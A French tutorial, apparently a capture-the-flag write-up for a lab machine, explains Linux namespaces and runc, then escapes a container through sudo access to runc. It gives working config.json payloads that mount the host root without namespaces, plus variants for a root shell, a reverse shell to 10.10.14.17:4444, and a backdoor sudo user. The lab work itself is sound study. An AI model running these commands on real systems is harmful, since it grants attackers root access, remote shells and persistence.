# Exploitation de runc via Misconfiguration

## <mark style="color:red;">Container Escape : Exploitation de runc via Misconfiguration</mark>

### <mark style="color:blue;">Concepts Fondamentaux</mark>

#### <mark style="color:green;">Qu'est-ce qu'un Conteneur Linux ?</mark>

Un conteneur n'est **PAS** une machine virtuelle. C'est un processus Linux isolé utilisant le **même kernel** que l'hôte.

**Comparaison VM vs Conteneur**

```
┌─────────────────────────────────┐
│    MACHINE VIRTUELLE (VM)       │
├─────────────────────────────────┤
│  VM 1        │  VM 2             │
│  OS complet  │  OS complet       │
│  Kernel      │  Kernel           │
│──────────────┴──────────────────│
│       Hypervisor (VMware)        │
│──────────────────────────────────│
│       Kernel hôte                │
└─────────────────────────────────┘

┌─────────────────────────────────┐
│         CONTENEURS               │
├─────────────────────────────────┤
│  Container 1 │  Container 2      │
│  Processus   │  Processus        │
│  isolé       │  isolé            │
│──────────────┴──────────────────│
│    MÊME Kernel (partagé)         │
│──────────────────────────────────│
│       Système hôte               │
└─────────────────────────────────┘
```

**Point clé :** Le conteneur partage le kernel de l'hôte → Si l'isolation échoue, accès direct à l'hôte !

#### <mark style="color:green;">Technologies d'Isolation</mark>

Les conteneurs utilisent deux mécanismes Linux :

1. **Namespaces** : Isolation des ressources système
2. **Cgroups** : Limitation des ressources (CPU, RAM, I/O)

***

### <mark style="color:blue;">Les Namespaces Linux</mark>

#### <mark style="color:green;">Les 7 Types de Namespaces</mark>

| Namespace   | Isole                       | Exemple                              |
| ----------- | --------------------------- | ------------------------------------ |
| **mount**   | Système de fichiers         | Le conteneur voit son propre `/`     |
| **pid**     | Processus                   | PID 1 dans le conteneur ≠ PID 1 hôte |
| **network** | Interfaces réseau           | Le conteneur a sa propre IP          |
| **ipc**     | Inter-Process Communication | Queues de messages isolées           |
| **uts**     | Hostname                    | Le conteneur a son propre hostname   |
| **user**    | UIDs/GIDs                   | UID 0 conteneur ≠ UID 0 hôte         |
| **cgroup**  | Vue des cgroups             | Isolation des limites de ressources  |

#### <mark style="color:green;">Fonctionnement du Mount Namespace</mark>

**Sans mount namespace (vision normale) :**

```bash
$ ls /
bin  boot  dev  etc  home  lib  root  usr  var
```

**Avec mount namespace (dans un conteneur) :**

```bash
Container$ ls /
app  bin  etc  lib  tmp
# Le conteneur ne voit QUE son rootfs !
```

**MAIS** : Même kernel sous-jacent !

```
Hôte :     /etc/shadow (protégé par namespaces)
              ↑
           Kernel
              ↓
Container: Ne voit pas /etc/shadow... normalement
```

***

### <mark style="color:blue;">runc : Le Runtime de Conteneur</mark>

#### Architecture des Outils de Conteneurisation

```
┌──────────────────────────────┐
│   Docker / Podman            │ ← Interface utilisateur
│   (haut niveau)              │   docker run ...
└────────────┬─────────────────┘
             │
             ↓
┌──────────────────────────────┐
│   containerd / CRI-O         │ ← Gestion d'images
│   (niveau intermédiaire)     │   et orchestration
└────────────┬─────────────────┘
             │
             ↓
┌──────────────────────────────┐
│         runc                 │ ← Création du conteneur
│      (bas niveau)            │   ⚠️ C'EST LUI QU'ON EXPLOITE
└────────────┬─────────────────┘
             │
             ↓
┌──────────────────────────────┐
│      Kernel Linux            │ ← Namespaces, cgroups
└──────────────────────────────┘
```

#### Rôle de runc

```bash
runc run mycontainer
```

**Actions de runc :**

1. Lit `config.json` (spécification OCI)
2. Crée les namespaces demandés
3. Monte le système de fichiers racine
4. Configure les cgroups
5. Lance le processus spécifié

***

### <mark style="color:blue;">Le Fichier config.json (OCI Spec)</mark>

#### Structure Complète

```json
{
  "ociVersion": "1.0.0",
  
  "process": {
    "terminal": false,
    "user": {
      "uid": 0,
      "gid": 0
    },
    "args": ["/bin/sh"],
    "env": ["PATH=/bin:/usr/bin"],
    "cwd": "/"
  },
  
  "root": {
    "path": "rootfs",
    "readonly": false
  },
  
  "mounts": [
    {
      "destination": "/proc",
      "type": "proc",
      "source": "proc"
    }
  ],
  
  "linux": {
    "namespaces": [
      {"type": "mount"},
      {"type": "pid"},
      {"type": "network"},
      {"type": "ipc"},
      {"type": "uts"},
      {"type": "user"}
    ]
  }
}
```

#### Sections Critiques

**1. Section `process`**

```json
"process": {
  "user": {"uid": 0, "gid": 0},  // ← UID dans le conteneur
  "args": ["/bin/bash", "-c", "cat /root/root.txt"]  // ← Commande
}
```

**Normalement :** Avec `user` namespace, UID 0 conteneur → UID 1000 hôte (mapping)

**Notre exploit :** Sans `user` namespace, UID 0 conteneur = UID 0 hôte (root réel !)

**2. Section `root`**

```json
"root": {
  "path": "rootfs"  // ← Répertoire contenant le FS du conteneur
}
```

**Configuration normale :**

```
/tmp/mycontainer/
├── config.json
└── rootfs/           ← Système de fichiers du conteneur
    ├── bin/
    ├── etc/
    └── lib/
```

**Notre exploit :**

```json
"root": {
  "path": "/"  // ← Utilise DIRECTEMENT la racine de l'hôte !
}
```

**3. Section `linux.namespaces` (LA CLÉ !)**

**Conteneur normal (isolé) :**

```json
"linux": {
  "namespaces": [
    {"type": "mount"},   // Isole le filesystem
    {"type": "pid"},     // Isole les processus
    {"type": "user"}     // Mappe les UIDs
  ]
}
```

**Notre exploit (AUCUNE isolation) :**

```json
"linux": {
  "namespaces": []  // ← VIDE = PAS D'ISOLATION !
}
```

***

### <mark style="color:blue;">Comparaison : Conteneur Normal vs Exploit</mark>

#### Conteneur Normal (Sécurisé)

```json
{
  "root": {"path": "rootfs"},
  "linux": {
    "namespaces": [
      {"type": "mount"},
      {"type": "pid"},
      {"type": "user"}
    ],
    "uidMappings": [
      {
        "containerID": 0,    // UID 0 dans le conteneur
        "hostID": 1000,      // → Mappé à UID 1000 sur l'hôte
        "size": 1
      }
    ]
  }
}
```

**Résultat :**

```
┌─────────────────────────────┐
│  Hôte (giveback.htb)        │
│                             │
│  /root/root.txt (inaccessible)
│                             │
│  ┌───────────────────────┐  │
│  │  Conteneur (isolé)    │  │
│  │                       │  │
│  │  Mount NS: voit       │  │
│  │    seulement rootfs/  │  │
│  │                       │  │
│  │  User NS: UID 0 →     │  │
│  │    UID 1000 (hôte)    │  │
│  │                       │  │
│  │  ❌ Pas d'accès hôte  │  │
│  └───────────────────────┘  │
└─────────────────────────────┘
```

#### Notre Exploit (Container Escape)

```json
{
  "root": {"path": "/"},      // ← Racine de l'HÔTE
  "linux": {
    "namespaces": []          // ← AUCUNE isolation
  }
}
```

**Résultat :**

```
┌─────────────────────────────┐
│  Hôte (giveback.htb)        │
│                             │
│  /root/root.txt ←──┐        │
│  /etc/shadow       │        │
│                    │        │
│  ┌─────────────────┼─────┐  │
│  │  "Conteneur"    │     │  │
│  │  (PAS isolé)    │     │  │
│  │                 │     │  │
│  │  PAS de Mount NS│     │  │
│  │  PAS de User NS │     │  │
│  │                 │     │  │
│  │  ✅ Accès TOTAL └─────┘  │
│  │     à l'hôte !        │  │
│  └───────────────────────┘  │
└─────────────────────────────┘
```

***

### <mark style="color:blue;">Exploitation Pratique</mark>

#### Prérequis

1.  **Accès sudo à runc** (ou équivalent)

    ```bash
    sudo -l
    # (ALL) NOPASSWD: /opt/debug
    # /opt/debug est en réalité runc !
    ```
2. **Capacité d'écriture** dans un répertoire (ex: `/tmp`)

#### Étape 1 : Création du Bundle

```bash
cd /tmp
mkdir exploit
cd exploit
```

**Bundle runc :** Répertoire contenant `config.json` (et optionnellement `rootfs/`)

#### Étape 2 : Configuration Malveillante

```bash
cat > config.json << 'EOF'
{
  "ociVersion": "1.0.0",
  "process": {
    "terminal": false,
    "user": {"uid": 0, "gid": 0},
    "args": ["/bin/bash", "-c", "cat /root/root.txt"],
    "cwd": "/"
  },
  "root": {
    "path": "/"
  },
  "linux": {
    "namespaces": []
  }
}
EOF
```

**Analyse ligne par ligne :**

```json
"terminal": false
```

* Pas de PTY (évite les erreurs `/dev/ptmx`)
* Parfait pour exécuter une commande et récupérer la sortie

```json
"user": {"uid": 0, "gid": 0}
```

* Processus en tant que root (UID 0)
* **SANS user namespace → UID 0 réel sur l'hôte !**

```json
"args": ["/bin/bash", "-c", "cat /root/root.txt"]
```

* Commande à exécuter
* Peut être n'importe quelle commande : `id`, `whoami`, `bash -i`, etc.

```json
"root": {"path": "/"}
```

* **LA CLÉS DE L'EXPLOIT !**
* Utilise `/` de l'hôte comme rootfs
* Le "conteneur" voit le système de fichiers réel

```json
"linux": {"namespaces": []}
```

* **AUCUN namespace**
* Pas d'isolation mount → Voit le vrai `/`
* Pas d'isolation user → UID 0 = root réel
* Pas d'isolation PID → Voit tous les processus

#### Étape 3 : Exécution

```bash
sudo /opt/debug --root /tmp/exploit run getflag
```

**Arguments :**

* `--root /tmp/exploit` : Répertoire contenant `config.json`
* `run getflag` : Crée et lance un conteneur nommé "getflag"

**Ce qui se passe :**

```
1. runc lit /tmp/exploit/config.json

2. runc SKIP la création de namespaces (liste vide)

3. runc fait chroot("/")  ← Racine de l'HÔTE

4. runc fait setuid(0)     ← Devient root RÉEL

5. runc fait execve("/bin/bash", ["-c", "cat /root/root.txt"])

6. Le processus bash tourne en root sur l'hôte !

7. Lit /root/root.txt de l'HÔTE

8. Affiche le flag !
```

**Output :**

```bash
$ sudo /opt/debug --root /tmp/exploit run getflag
a1b2c3d4e5f6...  ← Root flag !
```

***

### <mark style="color:blue;">Variantes d'Exploitation</mark>

#### <mark style="color:green;">Variante 1 : Shell Interactif</mark>

```json
{
  "ociVersion": "1.0.0",
  "process": {
    "terminal": true,        // ← PTY activé
    "user": {"uid": 0, "gid": 0},
    "args": ["/bin/bash"],   // ← Shell interactif
    "env": ["TERM=xterm", "PATH=/bin:/usr/bin:/sbin"],
    "cwd": "/root"
  },
  "root": {"path": "/"},
  "linux": {"namespaces": []}
}
```

**Exécution :**

```bash
sudo /opt/debug --root /tmp/exploit run -d rootshell
sudo /opt/debug --root /tmp/exploit exec rootshell /bin/bash
# Shell root interactif sur l'hôte !
```

#### <mark style="color:green;">Variante 2 : Reverse Shell</mark>

```json
{
  "process": {
    "terminal": false,
    "user": {"uid": 0, "gid": 0},
    "args": [
      "/bin/bash",
      "-c",
      "bash -i >& /dev/tcp/10.10.14.17/4444 0>&1"
    ]
  },
  "root": {"path": "/"},
  "linux": {"namespaces": []}
}
```

**Préparation :**

```bash
# Sur l'attaquant
nc -lnvp 4444

# Sur la cible
sudo /opt/debug --root /tmp/exploit run revshell
```

#### <mark style="color:green;">Variante 3 : Ajout d'Utilisateur Privilégié</mark>

```json
{
  "process": {
    "args": [
      "/bin/bash",
      "-c",
      "useradd -m -s /bin/bash -G sudo hacker && echo 'hacker:password' | chpasswd"
    ]
  },
  "root": {"path": "/"},
  "linux": {"namespaces": []}
}
```
